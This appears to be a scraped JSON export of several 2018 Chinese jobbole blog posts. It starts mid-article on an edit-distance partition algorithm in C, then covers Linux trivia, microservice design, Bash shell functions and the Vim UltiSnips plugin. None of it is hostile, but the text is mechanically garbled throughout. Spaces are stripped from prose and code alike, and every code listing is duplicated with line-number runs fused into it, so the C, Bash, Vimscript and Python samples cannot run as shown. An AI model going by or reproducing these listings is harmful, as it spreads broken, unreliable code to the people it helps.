的步骤，否则很容易踩坑。编辑矩阵第一列，肯定只有一个序列。每次遍历前一列的所有序列，根据推论1和推论2计算后一列的划分情况。如果前一列遍历完毕，但是下一列还有剩余的元素没有划分。没关系，下一列剩下的元素都归为一个新的序列。预处理一个表，表中记录T中的每个字符在P中的位置。可以直接用哈希算法（最好直接ascii码）进行定位，如果位置不唯一，可以拉链。进行列划分计算时，从前往后遍历那一链上的位置，直到找到第一个符合条件的，速度出奇的快。尽可能少使用或者不要使用map进行定位，测试发现相当慢。接下来做最不愿意做的事：贴一个代码，很丑。inlineintloc(intfind[][200],int*len,intch,intpos){for(inti=0;i&lt;len[ch];++i){if(find[ch][i]&gt;=pos)returnfind[ch][i];}return-1;}intnew_column_partition(char*p,char*t){intlen_p=strlen(p);intlen_t=strlen(t);intfind[26][200];intlen[26]={0};intpart[200];//记录每一个序列的结束位置//生成loc表，用来快速查询for(inti=0;i&lt;len_p;++i){find[p[i]-'a'][len[p[i]-'a']++]=i+1;}intpre_cn=0,next_cn=1,min_v=len_p;part[0]=len_p;for(inti=0;i&lt;len_t;++i){//前一列partition数pre_cn=next_cn;next_cn=0;intl=part[0]+1;intb=1;inte=l;inttmp;inttmp_value=0;intpre_v=part[0];//前一列第0个partition长度肯定&gt;=1if(len[t[i]-'a']&gt;0&amp;&amp;(tmp=loc(find,len,t[i]-'a',b))!=-1&amp;&amp;tmp&lt;=e){part[next_cn++]=tmp-1;}elseif(pre_cn&gt;=2&amp;&amp;part[1]-part[0]!=0){part[next_cn++]=part[0]+1;}else{part[next_cn++]=part[0];}//每列第一个partition尾值tmp_value=part[0];//遍历前一列剩下的partitionfor(intj=1;j&lt;pre_cn&amp;&amp;part[next_cn-1]&lt;len_p;++j){intx=part[j],y=pre_v;pre_v=part[j];l=x-y;if(l==0){part[next_cn++]=x+1;}else{b=x-l+2;e=x+1;if(b&lt;=len_p&amp;&amp;len[t[i]-'a']&gt;0&amp;&amp;(tmp=loc(find,len,t[i]-'a',b))!=-1&amp;&amp;tmp&lt;=e){part[next_cn++]=tmp-1;}elseif(j+1&lt;pre_cn&amp;&amp;part[j+1]-x!=0){part[next_cn++]=x+1;}else{part[next_cn++]=x;}}l=part[j]-part[j-1];if(l==0){//新得到的partition长度为0，那么下一个partition的起始值比上一个partition尾值少1tmp_value-=1;}else{tmp_value+=l-1;}}if(part[next_cn-1]!=len_p){part[next_cn++]=len_p;tmp_value+=len_p-part[next_cn-2]-1;if(tmp_value&lt;min_v){min_v=tmp_value;}}else{min_v=min_v&lt;tmp_value?min_v:tmp_value;}}returnmin_v;}123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081inlineintloc(intfind[][200],int*len,intch,intpos){for(inti=0;i&lt;len[ch];++i){if(find[ch][i]&gt;=pos)returnfind[ch][i];}return-1;}intnew_column_partition(char*p,char*t){intlen_p=strlen(p);intlen_t=strlen(t);intfind[26][200];intlen[26]={0};intpart[200];//记录每一个序列的结束位置//生成loc表，用来快速查询for(inti=0;i&lt;len_p;++i){find[p[i]-'a'][len[p[i]-'a']++]=i+1;}intpre_cn=0,next_cn=1,min_v=len_p;part[0]=len_p;for(inti=0;i&lt;len_t;++i){//前一列partition数pre_cn=next_cn;next_cn=0;intl=part[0]+1;intb=1;inte=l;inttmp;inttmp_value=0;intpre_v=part[0];//前一列第0个partition长度肯定&gt;=1if(len[t[i]-'a']&gt;0&amp;&amp;(tmp=loc(find,len,t[i]-'a',b))!=-1&amp;&amp;tmp&lt;=e){part[next_cn++]=tmp-1;}elseif(pre_cn&gt;=2&amp;&amp;part[1]-part[0]!=0){part[next_cn++]=part[0]+1;}else{part[next_cn++]=part[0];}//每列第一个partition尾值tmp_value=part[0];//遍历前一列剩下的partitionfor(intj=1;j&lt;pre_cn&amp;&amp;part[next_cn-1]&lt;len_p;++j){intx=part[j],y=pre_v;pre_v=part[j];l=x-y;if(l==0){part[next_cn++]=x+1;}else{b=x-l+2;e=x+1;if(b&lt;=len_p&amp;&amp;len[t[i]-'a']&gt;0&amp;&amp;(tmp=loc(find,len,t[i]-'a',b))!=-1&amp;&amp;tmp&lt;=e){part[next_cn++]=tmp-1;}elseif(j+1&lt;pre_cn&amp;&amp;part[j+1]-x!=0){part[next_cn++]=x+1;}else{part[next_cn++]=x;}}l=part[j]-part[j-1];if(l==0){//新得到的partition长度为0，那么下一个partition的起始值比上一个partition尾值少1tmp_value-=1;}else{tmp_value+=l-1;}}if(part[next_cn-1]!=len_p){part[next_cn++]=len_p;tmp_value+=len_p-part[next_cn-2]-1;if(tmp_value&lt;min_v){min_v=tmp_value;}}else{min_v=min_v&lt;tmp_value?min_v:tmp_value;}}returnmin_v;}结语这个算法应用到线上之后，效果非常明显，如下对比。优化前CPU：优化后CPU：能力有限，证明不充分，有兴趣的小果伴可以直接去看原版论文，欢迎交流，共同进步。1赞1收藏评论", "url_object_id": "9001107b7d2f77903c7b54070031412d"},{"title": "Linux 27 周年，这 27 件相关的有趣事实你可能不知道", "url": "http://blog.jobbole.com/114321/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/07da294f28a2b2db5b251dfd6a548197.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,2,6, ,·", "content": "原文出处：OMGUbuntu译文出处：开源中国许多人认为10月5日是Linux系统的周年纪念日，因为这是Linux在1991年首次对外公布的时间。不过，你可能不知道的是，早在1991年8月25日，当年还是大学生的LinusTorvalds就向comp.os.minix新闻组的人透露了由于“业余爱好”他正在研究操作系统的消息。因此，该时间也被许多爱好者视为Linux的真正诞生日期。为纪念Linux27岁诞辰，OMGUbuntu列出了27个与Linux和LinusTorvalds相关的有趣事实。1、截至2018年，Linux内核已有20,323,379行代码。尽管近期有所减少，但庞大的代码量意味着Linux仍然是地球上（单个）最大的开源项目。2、Linux差点不叫这个名字！LinusTorvalds原本想把他的“业余爱好”项目称为“FreaX”（“Free”和“Unix”的组合）。值得庆幸的是，他早期使用的代码托管服务器的所有者说服了他，最终取名为“Linux”（“Linus”和“Unix”的组合）。3、首个Linux版本100％由LinusTorvalds编写，但最新的版本仅包含不到1％的Linus编写的代码。他并不懈怠，现在主要是忙于管理和合并其他开发者编写的代码。4、Linux被世界上所有主要的太空计划使用，包括NASA和ESA。5、谈及更广阔的宇宙，有以Linux和LinusTorvalds命名的小行星。6、Linux的吉祥物Tux之所以是一只企鹅，据Linus回忆是因为他曾经被一只愤怒的企鹅咬伤。7、Linux完全统治超级计算机。截至2018年，世界上最快的500个超级计算机100％运行Linux。8、Linux开发社区非常活跃。据统计，在过去15个月里，LinuxKernel以平均每小时7.8个补丁的速度被合并。9、Linux早期以MINIX操作系统为原型，导致Linus采用类似于Minix的文件系统布局来实现他的新兴项目。之后由于被证明效率低下，Linus采用“扩展文件系统”（ext）取代它，至今仍在使用。10、Linux1.0于1994年3月14日发布，共包含176,250行代码。2.0版本紧随其后，于1996年发布。11、Linux正运行在从智能手机到服务器，再到潜艇和太空火箭等大量事物上。12、乔布斯曾在2000年为LinusTorvalds提供一份工作，条件是他停止在Linux上的开发。Linus拒绝了。13、Linux有多成功？它的长期竞争对手微软，在90年代初曾试图“熄灭”该项目，到现在却在利用Linux进行服务器业务，甚至在为内核开发做贡献！14、说到贡献，谷歌、英特尔、华为、三星、红帽、Canonical和Facebook是近年来Linux内核开发的主要贡献者。15、Linus出生于芬兰，一个双语国家，并认为瑞典语是他的“母语”。他说，由于发音不同，他常常觉得用英语说话“不舒服”，但却更喜欢阅读英文书籍。16、Linux可能是现在最大的自由软件项目（参见第一条），不过在1991年首次发布时，它仅有约10万行代码。17、在重新调整其开发和发布时间表后，新版本的Linuxkernel现在基本每隔66天左右发布一次。18、Linux不是LinusTrovalds唯一知名的作品，还有Git版本控制系统和潜水应用Subsurface。19、据估计，90％的好莱坞视觉效果在生产流程的某个阶段依赖于Linux。20、根据openhub.net的统计数据，超过95％的Linux是用C语言编写的。21、最新版本的Linuxkernel可能有13.3％的代码由空行组成。这并非毫无意义，空行是严谨的编码风格的一部分，使内核保持整洁、高效和有序。22、基于Linux的Android是目前全球最成功的移动操作系统。23、Linux的每个内核版本都有一个有趣的代号，比如v4.13的“FearlessCoyote”(v4.13)和v4.18的“MercilessMoray”。24、据红帽所述，排名前十的公有云中有9个是运行在Linux上的。25、Ubuntu是世界上最流行的基于Linux的桌面操作系统，它在全球拥有约2000万用户。Linux占台式计算机约2％的使用份额。26、第一本关于Linux的出版物是MattWelsh于1993年出版的“Linux安装和入门”。第一本专刊“LinuxJournal”于1994年3月出版，并首次对Linus进行了采访。27、Linux是开源领域最着名的模范，但其实早期版本的Linux是禁止商业使用或再分发的。直到1992年发布0.12版本，Linus才采用GPL协议。1赞收藏评论", "url_object_id": "f24ce825da4820b7e7dbda3b9fa2020b"},{"title": "设计微服务的最佳实践", "url": "http://blog.jobbole.com/114308/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/bb278c4985b1e32dab4f29c11a7c0bdc.png"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,2,3, ,·", "content": "原文出处：帝都羊你是否曾想过，什么是微服务？以及大规模的互联网行业，例如社交，电商，物流，金融等领域，如何使用微服务构建互联网应用以满足用户需求。要了解微服务是什么，你必须了解如何将单体应用程序，拆解为独立打包和部署的微型应用程序。本文章将帮助你清晰化的理解，开发者如何根据需求使用微服务来构建他们的应用程序。下面，从以下几个维度进行阐述为何选择微服务？什么是微服务？微服务架构的功能微服务架构的优点设计微服务的最佳实践1，为何选择微服务？现在，在我介绍微服务之前，让我们看看在微服务之前流行的架构，即单体架构。通俗地说，您可以说它类似于一个大容器，在这个容器中，应用程序的所有软件组件被紧密地打包并部署在一起。罗列一下单片架构的挑战：不灵活–单片应用程序无法使用不同的技术构建不可靠–即使系统的某个功能不起作用，整个系统也不起作用不可扩展–由于每次需要更新应用程序时都无法轻松扩展应用程序，因此必须重建整个系统妨碍持续开发–无法同时构建和部署应用程序的多个功能缓慢的开发–单体应用程序的开发需要花费大量的时间来构建，因为每个功能都必须一个接一个地构建不适合复杂的应用程序–复杂应用程序的功能具有紧密耦合的依赖关系上述挑战是导致微服务发展的主要原因。2，什么是微服务？微服务，又称微服务架构，是一种架构风格，它将应用程序构建为以业务领域为模型的小型自治服务集合。在微服务架构中，每个服务都是独立的，并实现单一业务功能。传统架构与微服务架构之间的差异以电子商务网站为例，了解它们之间的差异。我们在上图中观察到的主要区别是，所有功能最初都在共享单个数据库的单个实例下。但是，通过微服务，每个功能都被分配了不同的微服务，处理自己的数据，并执行不同的功能。现在，让我们通过查看其架构来了解有关微服务的更多信息。请参考下图：微服务架构1，来自不同设备的不同客户端尝试使用不同的服务，如搜索，构建，配置和其他管理功能2，所有服务都根据其域和功能分开，并进一步切分成各个微服务3，这些微服务有自己的负载均衡器和执行环境来执行它们的功能，同时在自己的数据库中捕获数据4，所有微服务都通过无状态服务器（REST或消息队列）相互通信5，微服务在服务发现中心的帮助下获取其通信路径，并执行自动化，监控等操作功能6，然后，微服务执行的所有功能都通过API网关传达给客户端7，所有内部点都从API网关连接。因此，任何连接到API网关的人都会自动连接到整个系统现在，让我们通过查看其功能来了解有关微服务的更多信息。3，微服务功能解耦–系统内的服务很大程度上是分离的。因此，整个应用程序可以轻松构建，更改和扩展组件化–微服务被视为可以轻松更换和升级的独立组件业务能力–微服务非常简单，专注于单一功能自治–开发人员和团队可以彼此独立工作，从而提高速度持续交付–通过软件创建，测试和审批的系统自动化，允许频繁发布软件职责–微服务不关注作为项目的应用程序。相反，他们将应用程序视为他们负责的产品分散治理–重点是使用正确的工具来做正确的工作。这意味着没有标准化模式或任何技术模式。开发人员可以自由选择最有用的工具来解决他们的问题敏捷–微服务支持敏捷开发。任何新功能都可以快速开发并再次丢弃。4，微服务的优点独立开发–所有微服务都可以根据各自的功能轻松开发独立部署–基于其服务，可以在任何应用程序中单独部署它们故障隔离–即使应用程序的一项服务不起作用，系统仍可继续运行混合技术堆栈–可以使用不同的语言和技术来构建同一应用程序的不同服务粒度缩放–单个组件可根据需要进行部署节点缩放，无需将所有组件部署缩放在一起5，设计微服务的最佳实践在当今世界，复杂性已经蔓延到互联网的每个产品当中。微服务架构有望保持团队规模和功能更好。现在，让我们看一个案列来更好地理解微服务。案例：购物网站当您打开购物网站时，您看到的只是一个购买页面。但是，在幕后，购物网站具有接受付款的服务，用于客户咨询的服务等假设此网站的开发人员已在单一框架中创建它。请参阅下图：因此，所有功能都放在一个代码库中，并且位于单个底层数据库下。现在，让我们假设市场上出现了一个新的品牌，开发商希望将即将到来的品牌所有细节都放在这个网站中，原有的数据库结构和UI展示已经无法满足。然后，他们不仅需要为新标签重做服务，而且还必须重新构建整个系统并相应地进行部署。为避免此类挑战，购物网站的开发人员决定将其应用程序从单片架构转移到微服务。请参阅下图了解购物网站的微服务架构。这意味着开发人员不会创建Web微服务，逻辑微服务或数据库微服务。相反，他们为搜索，推荐，客户服务等创建单独的微服务。这种类型的应用程序架构不仅可以帮助开发人员克服以前架构所面临的所有挑战，还可以帮助轻松构建，部署和扩展购物车应用程序。通过上述案列，我们可以总结出来，设计微服务的最佳实践：1，为每个微服务分别存储数据2，将代码保持在类似的成熟度级别3，为每个微服务单独构建4，部署到容器5，将服务设计为无状态服务1赞1收藏评论", "url_object_id": "3d6b98bd9089c6d286e9cd56043a5c06"},{"title": "如何在 Linux Shell 编程中定义和使用函数", "url": "http://blog.jobbole.com/114329/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/6c675d44b9dd5ed6bd448d1d9d31c4eb.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,2,9, ,·", "content": "原文出处：PradeepKumar译文出处：Linux中国/LuMing函数是一段可复用的代码。我们通常把重复的代码放进函数中并且在不同的地方去调用它。库是函数的集合。我们可以在库中定义经常使用的函数，这样其它脚本便可以不再重复代码而使用这些函数。本文我们将讨论诸多关于函数的内容和一些使用技巧。为了方便演示，我将在Ubuntu系统上使用BourneAgainSHell(Bash)。调用函数在Shell中调用函数和调用其它命令是一模一样的。例如，如果你的函数名称为my_func，你可以在命令行中像下面这样执行它：$my_func1$my_func如果你的函数接收多个参数，那么可以像下面这样写（类似命令行参数的使用）：$my_funcarg1arg2arg31$my_funcarg1arg2arg3定义函数我们可以用下面的语法去定义一个函数：functionfunction_name{Bodyoffunction}123functionfunction_name{Bodyoffunction}函数的主体可以包含任何有效的命令、循环语句和其它函数或脚本。现在让我们创建一个简单的函数，它向屏幕上显示一些消息（注：直接在命令行里写）。functionprint_msg{echo\"Hello,World\"}123functionprint_msg{echo\"Hello,World\"}现在，让我们执行这个函数：$print_msgHello,World12$print_msgHello,World不出所料，这个函数在屏幕上显示了一些消息。在上面的例子中，我们直接在终端里创建了一个函数。这个函数也可以保存到文件中。如下面的例子所示。#!/bin/bashfunctionprint_msg{echo\"Hello,World\"}print_msg12345#!/bin/bashfunctionprint_msg{echo\"Hello,World\"}print_msg我们已经在function.sh文件中定义了这个函数。现在让我们执行这个脚本：$chmod+xfunction.sh$./function.shHello,World123$chmod+xfunction.sh$./function.shHello,World你可以看到，上面的输出和之前的是一模一样的。更多函数用法在上一小节中我们定义了一个非常简单的函数。然而在软件开发的过程中，我们需要更多高级的函数，它可以接收多个参数并且带有返回值。在这一小节中，我们将讨论这种函数。向函数传递参数我们可以像调用其它命令那样给函数提供参数。我们可以在函数里使用美元$符号访问到这些参数。例如，$1表示第一个参数，$2代表第二个参数，以此类推。让我们修改下之前的函数，让它以参数的形式接收信息。修改后的函数就像这样：functionprint_msg{echo\"Hello$1\"}123functionprint_msg{echo\"Hello$1\"}在上面的函数中我们使用$1符号访问第一个参数。让我们执行这个函数：$print_msg\"LinuxTechi\"1$print_msg\"LinuxTechi\"执行完后，生成如下信息：HelloLinuxTechi1HelloLinuxTechi从函数中返回数值跟其它编程语言一样，Bash提供了返回语句让我们可以向调用者返回一些数值。让我们举例说明：functionfunc_return_value{return10}123functionfunc_return_value{return10}上面的函数向调用者返回10。让我们执行这个函数：$func_return_value$echo\"Valuereturnedbyfunctionis:$?\"12$func_return_value$echo\"Valuereturnedbyfunctionis:$?\"当你执行完，将会产生如下的输出结果：Valuereturnedbyfunctionis:101Valuereturnedbyfunctionis:10提示：在Bash中使用$?去获取函数的返回值。函数技巧目前我们已经对Bash中的函数有了一些了解。现在让我们创建一些非常有用的Bash函数，它们可以让我们的生活变得更加轻松。Logger让我们创建一个logger函数，它可以输出带有日期和时间的log信息。functionlog_msg{echo\"[`date'+%F%T'`]:$@\"}123functionlog_msg{echo\"[`date'+%F%T'`]:$@\"}执行这个函数：$log_msg\"Thisissamplelogmessage\"1$log_msg\"Thisissamplelogmessage\"执行完，就会生成如下信息：[2018-08-1619:56:34]:Thisissamplelogmessage1[2018-08-1619:56:34]:Thisissamplelogmessage显示系统信息让我们创建一个显示GNU/Linux信息的函数functionsystem_info{echo\"###OSinformation###\"lsb_release-aechoecho\"###Processorinformation###\"processor=`grep-wc\"processor\"/proc/cpuinfo`model=`grep-w\"modelname\"/proc/cpuinfo|awk-F:'{print$2}'`echo\"Processor=$processor\"echo\"Model=$model\"echoecho\"###Memoryinformation###\"total=`grep-w\"MemTotal\"/proc/meminfo|awk'{print$2}'`free=`grep-w\"MemFree\"/proc/meminfo|awk'{print$2}'`echo\"Totalmemory:$totalkB\"echo\"Freememory:$freekB\"}123456789101112131415161718functionsystem_info{echo\"###OSinformation###\"lsb_release-aechoecho\"###Processorinformation###\"processor=`grep-wc\"processor\"/proc/cpuinfo`model=`grep-w\"modelname\"/proc/cpuinfo|awk-F:'{print$2}'`echo\"Processor=$processor\"echo\"Model=$model\"echoecho\"###Memoryinformation###\"total=`grep-w\"MemTotal\"/proc/meminfo|awk'{print$2}'`free=`grep-w\"MemFree\"/proc/meminfo|awk'{print$2}'`echo\"Totalmemory:$totalkB\"echo\"Freememory:$freekB\"}执行完后会生成以下信息：###OSinformation###NoLSBmodulesareavailable.DistributorID:UbuntuDescription:Ubuntu18.04.1LTSRelease:18.04Codename:bionic###Processorinformation###Processor=1Model=Intel(R)Core(TM)i7-7700HQCPU@2.80GHz###Memoryinformation###Totalmemory:4015648kBFreememory:2915428kB1234567891011121314###OSinformation###NoLSBmodulesareavailable.DistributorID:UbuntuDescription:Ubuntu18.04.1LTSRelease:18.04Codename:bionic###Processorinformation###Processor=1Model=Intel(R)Core(TM)i7-7700HQCPU@2.80GHz###Memoryinformation###Totalmemory:4015648kBFreememory:2915428kB在当前目录下查找文件或者目录下面的函数从当前目录下查找文件或者目录：functionsearch{find.-name$1}123functionsearch{find.-name$1}让我们使用下面的命令查找dir4这个目录：$searchdir41$searchdir4当你执行完命令后，将会产生如下输出：./dir1/dir2/dir3/dir41./dir1/dir2/dir3/dir4数字时钟下面的函数在终端里创建了一个简单的数字时钟：functiondigital_clock{clearwhile[1]dodate+'%T'sleep1cleardone}123456789functiondigital_clock{clearwhile[1]dodate+'%T'sleep1cleardone}函数库库是函数的集合。将函数定义在文件里并在当前环境中导入那个文件，这样可以创建函数库。假设我们已经在utils.sh中定义好了所有函数，接着在当前的环境下使用下面的命令导入函数：$sourceutils.sh1$sourceutils.sh之后你就可以像调用其它Bash命令那样执行库中任何的函数了。总结本文我们讨论了诸多可以提升效率的实用技巧。我希望这篇文章能够启发你去创造自己的技巧。1赞收藏评论", "url_object_id": "080b4358ddc02845c1a0afd499acafac"},{"title": "Vim 代码片段插件 Ultisnips 使用教程", "url": "http://blog.jobbole.com/114334/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/04/vim-logo.png"], "praise_nums": 2, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,0,3, ,·", "content": "本文作者：伯乐在线-keelii。未经作者许可，禁止转载！欢迎加入伯乐在线专栏作者。安装Ultisnips插件安装分两部分，一个是ultisnips插件本身，另外一个是代码片段仓库。一般来说把默认的代码片段仓库下载下来按需修改后上传到自己的github即可。如果你和我一样也使用vim-plug来管理插件的话，添加下面的代码到你的vimrc中保存刷新即可Plug'SirVer/ultisnips'#你自己的代码仓库git地址Plug'keelii/vim-snippets'123Plug'SirVer/ultisnips'#你自己的代码仓库git地址Plug'keelii/vim-snippets'上面的示例中所有的代码片段都存放在插件安装目录下面的vim-snippets/UltiSnips中，文件命名格式为ft.snippets,ft就是vim中的filetype，其中有个all.snippets是唯一一个所有文件都适用的代码片段配置快捷键设置，我一般使用tab来触发代码片段补全，且不使用YCM（官方文档表示使用YCM的话就不能使用tab补全）letg:UltiSnipsExpandTrigger=\"&lt;tab&gt;\"\"使用tab切换下一个触发点，shit+tab上一个触发点letg:UltiSnipsJumpForwardTrigger=\"&lt;tab&gt;\"letg:UltiSnipsJumpBackwardTrigger=\"&lt;S-tab&gt;\"\"使用UltiSnipsEdit命令时垂直分割屏幕letg:UltiSnipsEditSplit=\"vertical\"123456letg:UltiSnipsExpandTrigger=\"&lt;tab&gt;\"\"使用tab切换下一个触发点，shit+tab上一个触发点letg:UltiSnipsJumpForwardTrigger=\"&lt;tab&gt;\"letg:UltiSnipsJumpBackwardTrigger=\"&lt;S-tab&gt;\"\"使用UltiSnipsEdit命令时垂直分割屏幕letg:UltiSnipsEditSplit=\"vertical\"依赖ultisnips插件需要你的vim支持python，可以在vim命令模式下使用下面的检测你的vim版本是否支持python#1表示支持:echohas(\"python\"):echohas(\"python3\")123#1表示支持:echohas(\"python\"):echohas(\"python3\")定义一个代码片段定义格式snippet触发字符[\"代码片段说明\"[参数]]代码片段内容endsnippet123snippet触发字符[\"代码片段说明\"[参数]]代码片段内容endsnippet最小化的一个代码片段snippetif\"if(condition){...}\"if(${1:true}){$0}endsnippet12345snippetif\"if(condition){...}\"if(${1:true}){$0}endsnippet这时当你在vim中输入if敲tab就会展开一条if语句，第一个触发点是if条件表达式，最后一个是if语句体${1:true}表示这是第一个触发点，占位符为true，如果占位符没有默认值可直接使用$1,$2,$3…可视选择区的内容为占位符snippetif\"if(...)\"if(${1:true}){${VISUAL}}endsnippet12345snippetif\"if(...)\"if(${1:true}){${VISUAL}}endsnippet${VISUAL}表示在vim中使用可视模式下选择的文本，这个在重构代码的时候非常有用（后面会有高级用法），上个图感受一下：代码片段的参数b表示触发字符应该在一行的开始i表示触发字符可以在单词内（连续展示会使用这个选项）w表示触发字符的前后必须是一个字母分界点r表示触发字符可以是一个正则表达式t表示展开的代码片段中如果有制表符，原样输出，即使你的vimrc里面设置了expandtabm表示删除代码片段右边的所有空白字符e表示自定义上下文A表示自动触发，不需要按tab，类似于VIM中的abbr内容解释器Ultisnips定义的代码片段中支持三种不同的语言注入：shell,vimscript,python，在代码片段中用反引号表示shell代码就是在你的命令行shell能执行的代码片段，比如输出当前时间➜date2018年8月27日星期一18时19分38秒CST12➜date2018年8月27日星期一18时19分38秒CST在代码片段中用反引号「`」引用即可snippettodayTodayisthe`date`.endsnippet123snippettodayTodayisthe`date`.endsnippet输入today按tab展开后（格式和上面shell中的不一样，估计是因为vim语言设置的问题）：TodayistheMonAug2718:24:51CST2018.1TodayistheMonAug2718:24:51CST2018.vimscript代码使用indent来输出当前缩进值，使用前缀!v表示是vimscriptsnippetindentIndentis:`!vindent(\".\")`.endsnippet123snippetindentIndentis:`!vindent(\".\")`.endsnippetpython代码在代码片段中解释执行python代码是ultisnips最强大的功能，以前缀!p开始。系统会向python中注入一些变量，可以使用python代码直接对其进行操作fn–表示当前文件名path–当前文件名的路径t–占位符的字典，可以使用t[1],t[2],t.v来取占位符内容snip–UltiSnips.TextObjects.SnippetUtil对象的一个实例match–正则代码片段时返回的匹配元素（非常强大）其中最常用的snip对象提供了下面一些变量：snip.rv表示returnvalue，python代码执行后处理过的字符串赋给rv即可snip.fn表示当前文件名snip.ft表示当前文件类型snip.v表示VISUAL模式变量，其中snip.v.mode表示模式类型，snip.v.text表示VISUAL模式中选择的字符占位符选择UltiSnips支持使用快捷键切换占位符，我使用&lt;tab&gt;和&lt;shift-tab&gt;来切换下一个和上一个占位符，占位符切换的作用域为当前代码片段内部（即使占位符已被修改过），当光标移动出去以后就不起作用了自定义上下文自定义上下文可以通过正则匹配来决定代码片断是否可用，比如判断在指定的if语句里面才起作用的代码片断，定义格式如下：snippet触发字符“描述”“表达式”参数比如我们定义一个只有在上一行以if(DEVELOPMENT){开头才可以展开的代码片段snippetdbg\"if(DEVELOPMENT)dbg\"\"re.match('^if\\(DEVELOPMENT\\)\\{',snip.buffer[snip.line-1])\"bedebugger;endsnippet123snippetdbg\"if(DEVELOPMENT)dbg\"\"re.match('^if\\(DEVELOPMENT\\)\\{',snip.buffer[snip.line-1])\"bedebugger;endsnippet常见用法行内连续展开这个常见于需要连续展开代码片段的情况，比如，有两个片段，一个打印变量，一个处理JSON序列化。这时需要使用参数选项in-word使用正则代码片段通常写代码的时候需要使用log,print等来打印上下文中的变量。使用普通片段按cl展示console.log()然后把变量字符复制进括号，这样操作会比较复杂。使用正则来动态匹配前面的字符可以很好的解决这个问题#展开console.logsnippet\"([^\\s]\\w+)\\.log\"\"console.log(postfix)\"rconsole.log(`!psnip.rv=match.group(1)`)$0endsnippet#当前行转换成大写snippet\"([^\\s].*)\\.upper\"\"Uppercase(postfix)\"r`!psnip.rv=match.group(1).upper()`$0endsnippet#上一个单词转换成小写snippet\"([^\\s]\\w+)\\.lower\"\"Lowercase(postfix)\"r`!psnip.rv=match.group(1).lower()`$0endsnippet123456789101112#展开console.logsnippet\"([^\\s]\\w+)\\.log\"\"console.log(postfix)\"rconsole.log(`!psnip.rv=match.group(1)`)$0endsnippet#当前行转换成大写snippet\"([^\\s].*)\\.upper\"\"Uppercase(postfix)\"r`!psnip.rv=match.group(1).upper()`$0endsnippet#上一个单词转换成小写snippet\"([^\\s]\\w+)\\.lower\"\"Lowercase(postfix)\"r`!psnip.rv=match.group(1).lower()`$0endsnippet动图演示注意：正则代码片段只适用于单行文本处理，如果是多行转换还是得用到下面的python+VISUAL代码片段来处理使用python解释器+VISUAL模式实现代码注释功能通常我们需要使用一大堆插件来实现各种代码的注释功能。不过Ultisnips提供了VISUAL模式可以提取vim可视模式中选择的内容到代码片段里面，于是我们就可以结合起来制作一个具有注释功能的代码片段流程大概是这样的：进入vim可视模式，选择要注释的内容按tab，清除选择内容输入代码片段触发字符，按tab完成由于实现的python代码相对复杂一些，主要分成两个方法。单行注释和多行注释，注意Ultisnips中可以直接写python但是大段的方法建议放在插件目录下面的pythonx目录下面，使用的时候在对应的代码片段中的全局python代码global!p引入即可单行注释(pythonx/javascript_snippets.py)：defcomment(snip,START=\"\",END=\"\"):lines=snip.v.text.split('\\n')[:-1]first_line=lines[0]spaces=''initial_indent=snip._initial_indent#Getthefirstnon-emptylineforidx,linenumerate(lines):ifl.strip()!='':first_line=lines[idx]sp=re.findall(r'^\\s+',first_line)iflen(sp):spaces=sp[0]break#Uncommentiffirst_line.strip().startswith(START):result=[line.replace(START,\"\",1).replace(END,\"\",1)ifline.strip()elselineforlineinlines]else:result=[f'{spaces}{START}{line[len(spaces):]}{END}'ifline.strip()elselineforlineinlines]#Removeinitialindentifresult[0]andinitial_indent:result[0]=result[0].replace(initial_indent,'',1)ifresult:return'\\n'.join(result)else:return''1234567891011121314151617181920212223242526272829defcomment(snip,START=\"\",END=\"\"):lines=snip.v.text.split('\\n')[:-1]first_line=lines[0]spaces=''initial_indent=snip._initial_indent#Getthefirstnon-emptylineforidx,linenumerate(lines):ifl.strip()!='':first_line=lines[idx]sp=re.findall(r'^\\s+',first_line)iflen(sp):spaces=sp[0]break#Uncommentiffirst_line.strip().startswith(START):result=[line.replace(START,\"\",1).replace(END,\"\",1)ifline.strip()elselineforlineinlines]else:result=[f'{spaces}{START}{line[len(spaces):]}{END}'ifline.strip()elselineforlineinlines]#Removeinitialindentifresult[0]andinitial_indent:result[0]=result[0].replace(initial_indent,'',1)ifresult:return'\\n'.join(result)else:return''多行注释：defcomment_inline(snip,START=\"/*\",END=\"*/\"):text=snip.v.textlines=text.split('\\n')[:-1]first_line=lines[0]initial_indent=snip._initial_indentspaces=''#Getthefirstnon-emptylineforidx,linenumerate(lines):ifl.strip()!='':first_line=lines[idx]sp=re.findall(r'^\\s+',first_line)iflen(sp):spaces=sp[0]breakiftext.strip().startswith(START):result=text.replace(START,'',1).replace(END,'',1)else:result=text.replace(spaces,spaces+START,1).rstrip('\\n')+END+'\\n'ifinitial_indent:result=result.replace(initial_indent,'',1)returnresult12345678910111213141516171819202122232425defcomment_inline(snip,START=\"/*\",END=\"*/\"):text=snip.v.textlines=text.split('\\n')[:-1]first_line=lines[0]initial_indent=snip._initial_indentspaces=''#Getthefirstnon-emptylineforidx,linenumerate(lines):ifl.strip()!='':first_line=lines[idx]sp=re.findall(r'^\\s+',first_line)iflen(sp):spaces=sp[0]breakiftext.strip().startswith(START):result=text.replace(START,'',1).replace(END,'',1)else:result=text.replace(spaces,spaces+START,1).rstrip('\\n')+END+'\\n'ifinitial_indent:result=result.replace(initial_indent,'',1)returnresult代码片段定义：global!pfromjavascript_snippetsimport(comment,comment_inline)endglobal#...snippetc\"Togglecommenteverysingleline\"`!psnip.rv=comment(snip,START='//',END='')`$0endsnippetsnippetci\"Togglecommentinline.\"`!psnip.rv=comment_inline(snip,START=\"/*\",END=\"*/\")`$0endsnippet12345678910111213141516171819global!pfromjavascript_snippetsimport(comment,comment_inline)endglobal#...snippetc\"Togglecommenteverysingleline\"`!psnip.rv=comment(snip,START='//',END='')`$0endsnippetsnippetci\"